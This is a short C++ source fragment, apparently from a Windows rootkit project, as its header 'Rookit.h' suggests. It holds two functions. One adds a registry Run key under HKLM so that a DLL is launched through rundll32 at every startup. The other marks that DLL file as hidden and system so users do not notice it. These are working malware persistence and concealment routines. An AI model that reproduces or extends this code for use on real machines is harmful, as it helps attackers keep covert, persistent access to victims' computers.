#include"Rookit.h"


void AddDllToStartup(wchar_t* dll) {
    std::wstring dllPath = dll;
    std::wstring functionName = L"StartUM";
    std::wstring value = L"StartUM";
    std::wstring command = L"rundll32.exe " + dllPath + L"," + functionName;

    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        return;
    }
    result = RegSetValueExW(hKey, value.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(command.c_str()), (command.size() + 1) * sizeof(wchar_t));
    if (result != ERROR_SUCCESS) {
        return;
    }
    RegCloseKey(hKey);
}
void HideDllFile(wchar_t* dllPath){
    if(SetFileAttributesW(dllPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)){
        
    }else{
        MessageBoxA(0, "fail", "info", 0);
    }
    // MessageBoxA(0, std::to_string(1).c_str(), 0, 0);
}
